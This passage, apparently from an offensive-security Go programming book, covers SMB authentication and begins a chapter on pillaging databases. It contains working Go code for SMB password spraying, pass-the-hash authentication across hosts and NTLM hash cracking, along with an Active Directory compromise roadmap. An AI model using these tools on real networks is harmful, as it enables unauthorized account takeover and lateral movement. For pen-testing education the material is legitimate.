r = bytes.NewBuffer(meta.ParentBuf[offset : offset+length])
// Variable length data fields do NOT advance current offset.
}
data := make([]byte, length) ❼
if err := binary.Read(r, binary.LittleEndian, &data)❽; err != nil {
return nil, err
}
return data, nil
Listing 6-11: Unmarshaling fixed- and variable-length byte slices (/ch-
6/smb/smb/encoder/encoder.go/)
First, we use reflection to determine the slice’s element
type ❶. For example, handling of []uint8 is different from
[]uint32, as the number of bytes per element differs. In this case,
we’re handling only []uint8 slices. Next, we define a couple of
local variables, length and offset, to use for tracking the length of
the data to read and the offset within the buffer from which to
begin reading ❷. If the slice is defined with the fixed tag, we
retrieve the value and assign it to length ❸. Recall that the tag
value for the fixed key is an integer that defines the length of
the slice. We’ll use this length to advance the current buffer
offset for future reads ❹. For fixed-length fields, the offset is
left as its default value—zero—since it will always appear at
the current offset. Variable-length slices are slightly more
complex because we retrieve both the length ❺ and offset ❻
information from our Metadata structure. A field uses its own
name as the key for the lookup of the data. Recall how we
populated this information previously. With our length and offset
variables properly set, we then create a slice of the desired
length ❼ and use it in a call to binary.Read() ❽. Again, this
function is smart enough to read bytes up until our destination
slice has been filled.
This has been an exhaustingly detailed journey into the
dark recesses of custom tags, reflection, and encoding with a
hint of SMB. Let’s move beyond this ugliness and do
something useful with the SMB library. Thankfully, the
following use cases should be significantly less complicated.
GUESSING PASSWORDS WITH SMB
The first SMB case we’ll examine is a fairly common one for
attackers and pen testers: online password guessing over SMB.
You’ll try to authenticate to a domain by providing commonly
used usernames and passwords. Before diving in, you’ll need
to grab the SMB package with the following get command:
$ go get github.com/bhg/ch-6/smb
Once the package is installed, let’s get to coding. The code
you’ll create (shown in Listing 6-12) accepts a file of newline-
separated usernames, a password, a domain, and target host
information as command line arguments. To avoid locking
accounts out of certain domains, you’ll attempt a single
password across a list of users rather than attempt a list of
passwords across one or more users.
WARNING
Online password guessing can lock accounts out of a domain, effectively
resulting in a denial-of-service attack. Take caution when testing your code
and run this against only systems on which you’re authorized to test.
func main() {
if len(os.Args) != 5 {
log.Fatalln("Usage: main   
")
}
buf, err := ioutil.ReadFile(os.Args[1])
if err != nil {
log.Fatalln(err)
}
options := smb.Options❶{
Password: os.Args[2],
Domain: os.Args[3],
Host: os.Args[4],
Port: 445,
}
users := bytes.Split(buf, []byte{'\n'})
for _, user := range users❷ {
❸ options.User = string(user)
session, err := smb.NewSession(options, false)❹
if err != nil {
fmt.Printf("[-] Login failed: %s\\%s [%s]\n",
options.Domain,
options.User,
options.Password)
continue
}
defer session.Close()
if session.IsAuthenticated❺ {
fmt.Printf("[+] Success : %s\\%s [%s]\n",
options.Domain,
options.User,
options.Password)
}
}
}
Listing 6-12: Leveraging the SMB package for online password guessing (/ch-
6/password-guessing/main.go)
The SMB package operates on sessions. To establish a
session, you first initialize an smb.Options instance that will
contain all your session options, including target host, user,
password, port, and domain ❶. Next, you loop through each
of your target users ❷, setting the options.User value
appropriately ❸, and issue a call to smb.NewSession() ❹. This
function does a lot of heavy lifting for you behind the scenes:
it negotiates both the SMB dialect and authentication
mechanism, and then authenticates to the remote target. The
function will return an error if authentication fails, and a
boolean IsAuthenticated field on the session struct is populated
based off the outcome. It will then check the value to see
whether the authentication succeeded, and if it did, display a
success message ❺.
That is all it takes to create an online password-guessing
utility.
REUSING PASSWORDS WITH THE
PASS-THE-HASH TECHNIQUE
PASS-THE-HASH TECHNIQUE
The pass-the-hash technique allows an attacker to perform
SMB authentication by using a password’s NTLM hash, even
if the attacker doesn’t have the cleartext password. This
section walks you through the concept and shows you an
implementation of it.
Pass-the-hash is a shortcut to a typical Active Directory
domain compromise, a type of attack in which attackers gain
an initial foothold, elevate their privileges, and move laterally
throughout the network until they have the access levels they
need to achieve their end goal. Active Directory domain
compromises generally follow the roadmap presented in this
list, assuming they take place through an exploit rather than
something like password guessing:
1. The attacker exploits the vulnerability and gains a foothold on the network.
2. The attacker elevates privileges on the compromised system.
3. The attacker extracts hashed or cleartext credentials from LSASS.
4. The attacker attempts to recover the local administrator password via offline
cracking.
5. The attacker attempts to authenticate to other machines by using the
administrator credentials, looking for reuse of the password.
6. The attacker rinses and repeats until the domain administrator or other target has
been compromised.
With NTLMSSP authentication, however, even if you fail
to recover the cleartext password during step 3 or 4, you can
proceed to use the password’s NTLM hash for SMB
authentication during step 5—in other words, passing the hash.
Pass-the-hash works because it separates the hash
calculation from the challenge-response token calculation. To
see why this is, let’s look at the following two functions,
defined by the NTLMSSP specification, pertaining to the
cryptographic and security mechanisms used for
authentication:
NTOWFv2 A cryptographic function that creates an MD5
HMAC by using the username, domain, and password
values. It generates the NTLM hash value.
ComputeResponse A function that uses the NTLM hash in
combination with the message’s client and server
challenges, timestamp, and target server name to produce a
GSS-API security token that can be sent for authentication.
You can see the implementations of these functions in
Listing 6-13.
func Ntowfv2(pass, user, domain string) []byte {
h := hmac.New(md5.New, Ntowfv1(pass))
h.Write(encoder.ToUnicode(strings.ToUpper(user) + domain))
return h.Sum(nil)
}
func ComputeResponseNTLMv2(nthash❶, lmhash, clientChallenge,
serverChallenge, timestamp,
serverName []byte) []byte {
temp := []byte{1, 1}
temp = append(temp, 0, 0, 0, 0, 0, 0)
temp = append(temp, timestamp...)
temp = append(temp, clientChallenge...)
temp = append(temp, 0, 0, 0, 0)
temp = append(temp, serverName...)
temp = append(temp, 0, 0, 0, 0)
h := hmac.New(md5.New, nthash)
h.Write(append(serverChallenge, temp...))
ntproof := h.Sum(nil)
return append(ntproof, temp...)
}
Listing 6-13: Working with NTLM hashes (/ch-6/smb/ntlmssp/crypto.go)
The NTLM hash is supplied as input to the
ComputeResponseNTLMv2 function ❶, meaning the hash has been
created independently of the logic used for security token
creation. This implies that hashes stored anywhere—even in
LSASS—are considered precalculated, because you don’t
need to supply the domain, user, or password as input. The
authentication process is as follows:
1. Calculate the user’s hash by using the domain, user, and password values.
2. Use the hash as input to calculate authentication tokens for NTLMSSP over
SMB.
Since you already have a hash in hand, you’ve already
completed step 1. To pass the hash, you initiate your SMB
authentication sequence, as you defined it way back in the
opening sections of this chapter. However, you never calculate
the hash. Instead, you use the supplied value as the hash itself.
Listing 6-14 shows a pass-the-hash utility that uses a
password hash to attempt to authenticate as a specific user to a
list of machines.
func main() {
if len(os.Args) != 5 {
log.Fatalln("Usage: main    ")
}
buf, err := ioutil.ReadFile(os.Args[1])
if err != nil {
log.Fatalln(err)
}
options := smb.Options{
User: os.Args[2],
Domain: os.Args[3],
Hash❶: os.Args[4],
Port: 445,
}
targets := bytes.Split(buf, []byte{'\n'})
for _, target := range targets❷ {
options.Host = string(target)
session, err := smb.NewSession(options, false)
if err != nil {
fmt.Printf("[-] Login failed [%s]: %s\n", options.Host, err)
continue
}
defer session.Close()
if session.IsAuthenticated {
fmt.Printf("[+] Login successful [%s]\n", options.Host)
}
}
}
Listing 6-14: Passing the hash for authentication testing (/ch-6/password-
reuse/main.go)
This code should look similar to the password-guessing
example. The only significant differences are that you’re
setting the Hash field of smb.Options (not the Password field) ❶ and
you’re iterating over a list of target hosts (rather than target
users) ❷. The logic within the smb.NewSession() function will use
the hash value if populated within the options struct.
RECOVERING NTLM PASSWORDS
In some instances, having only the password hash will be
inadequate for your overall attack chain. For example, many
services (such as Remote Desktop, Outlook Web Access, and
others) don’t allow hash-based authentication, because it either
isn’t supported or isn’t a default configuration. If your attack
chain requires access to one of these services, you’ll need a
cleartext password. In the following sections, you’ll walk
through how hashes are calculated and how to create a basic
password cracker.
Calculating the Hash
In Listing 6-15, you perform the magic of calculating the hash.
func NewAuthenticatePass(domain, user, workstation, password string, c
Challenge) Authenticate
{
// Assumes domain, user, and workstation are not unicode
nthash := Ntowfv2(password, user, domain)
lmhash := Lmowfv2(password, user, domain)
return newAuthenticate(domain, user, workstation, nthash, lmhash, c)
}
func NewAuthenticateHash(domain, user, workstation, hash string, c Challenge)
Authenticate {
// Assumes domain, user, and workstation are not unicode
buf := make([]byte, len(hash)/2)
hex.Decode(buf, []byte(hash))
return newAuthenticate(domain, user, workstation, buf, buf, c)
}
Listing 6-15: Calculating hashes (/ch-6/smb/ntlmssp/ntlmssp.go)
The logic to call the appropriate function is defined
elsewhere, but you’ll see that the two functions are similar.
The real difference is that password-based authentication in
the NewAuthenticatePass() function computes the hash before
generating the authentication message, whereas the
NewAuthenticateHash() function skips that step and uses the
supplied hash directly as input to generate the message.
Recovering the NTLM Hash
In Listing 6-16, you can see a utility that recovers a password
by cracking a supplied NTLM hash.
func main() {
if len(os.Args) != 5 {
log.Fatalln("Usage: main    ")
}
hash := make([]byte, len(os.Args[4])/2)
_, err := hex.Decode(hash, []byte(os.Args[4]))❶
if err != nil {
log.Fatalln(err)
}
f, err := ioutil.ReadFile(os.Args[1])
if err != nil {
log.Fatalln(err)
}
var found string
passwords := bytes.Split(f, []byte{'\n'})
for _, password := range passwords❷ {
h := ntlmssp.Ntowfv2(string(password), os.Args[2], os.Args[3]) ❸
if bytes.Equal(hash, h)❹ {
found = string(password)
break
}
}
if found != "" {
fmt.Printf("[+] Recovered password: %s\n", found)
} else {
fmt.Println("[-] Failed to recover password")
}
}
Listing 6-16: NTLM hash cracking (/ch-6/password-recovery/main.go)
The utility reads the hash as a command line argument,
decoding it to a []byte ❶. Then you loop over a supplied
password list ❷, calculating the hash of each entry by calling
the ntlmssp.Ntowfv2() function we discussed previously ❸.
Finally, you compare the calculated hash with that of our
supplied value ❹. If they match, you have a hit and break out
of the loop.
SUMMARY
You’ve made it through a detailed examination of SMB,
touching on protocol specifics, reflection, structure field tags,
and mixed encoding! You also learned how pass-the-hash
works, as well as a few useful utility programs that leverage
the SMB package.
To continue your learning, we encourage you to explore
additional SMB communications, particularly in relation to
remote code execution, such as PsExec. Using a network
sniffer, such as Wireshark, capture the packets and evaluate
how this functionality works.
In the next chapter, we move on from network protocol
specifics to focus on attacking and pillaging databases.
7
ABUSING DATABASES AND
FILESYSTEMS
Now that we’ve covered the majority of common network
protocols used for active service interrogation, command and
control, and other malicious activity, let’s switch our focus to
an equally important topic: data pillaging.
Although data pillaging may not be as exciting as initial
exploitation, lateral network movement, or privilege
escalation, it’s a critical aspect of the overall attack chain.
After all, we often need data in order to perform those other
activities. Commonly, the data is of tangible worth to an
attacker. Although hacking an organization is thrilling, the
data itself is often a lucrative prize for the attacker and a
damning loss for the organization.
Depending on which study you read, a breach in 2020 can
cost an organization approximately $4 to $7 million. An IBM
study estimates it costs an organization $129 to $355 per
record stolen. Hell, a black hat hacker can make some serious
coin off the underground market by selling credit cards at a
rate of $7 to $80 per card
(http://online.wsj.com/public/resources/documents/securework
s_hacker_annualreport.pdf).
The Target breach alone resulted in a compromise of 40
million cards. In some cases, the Target cards were sold for as
much as $135 per card (http://www.businessinsider.com/heres-
what-happened-to-your-target-data-that-was-hacked-2014-
10/). That’s pretty lucrative. We, in no way, advocate that type
of activity, but folks with a questionable moral compass stand
to make a lot of money from data pillaging.
Enough about the industry and fancy references to online
articles—let’s pillage! In this chapter, you’ll learn to set up
and seed a variety of SQL and NoSQL databases and learn to
connect and interact with those databases via Go. We’ll also
demonstrate how to create a database and filesystem data
miner that searches for key indicators of juicy information.
SETTING UP DATABASES WITH
DOCKER
In this section, you’ll install various database systems and then
seed them with the data you’ll use in this chapter’s pillaging
examples. Where possible, you’ll use Docker on an Ubuntu
18.04 VM. Docker is a software container platform that makes
it easy to deploy and manage applications. You can bundle
applications and their dependencies in a manner that makes
their deployment straightforward. The container is
compartmentalized from the operating system in order to
prevent the pollution of the host platform. This is nifty stuff.
And for this chapter, you will use a variety of prebuilt
Docker images for the databases you’ll be working with. If
you don’t have it already, install Docker. You can find Ubuntu
instructions at https://docs.docker.com/install/linux/docker-
ce/ubuntu/.
NOTE
We’ve specifically chosen to omit details on setting up an Oracle instance.
Although Oracle provides VM images that you can download and use to
create a test database, we felt that it was unnecessary to walk you through
these steps, since they’re fairly similar to the MySQL examples below.
We’ll leave the Oracle-specific implementation as an exercise for you to do
independently.
Installing and Seeding MongoDB
MongoDB is the only NoSQL database that you’ll use in this
chapter. Unlike traditional relational databases, MongoDB
doesn’t communicate via SQL. Instead, MongoDB uses an
easy-to-understand JSON syntax for retrieving and
manipulating data. Entire books have been dedicated to
explaining MongoDB, and a full explanation is certainly
beyond the scope of this book. For now, you’ll install the
Docker image and seed it with fake data.
Unlike traditional SQL databases, MongoDB is schema-
less, which means that it doesn’t follow a predefined, rigid
rule system for organizing table data. This explains why you’ll
see only insert commands in Listing 7-1 without any schema
definitions. First, install the MongoDB Docker image with the
following command:
$ docker run --name some-mongo -p 27017:27017 mongo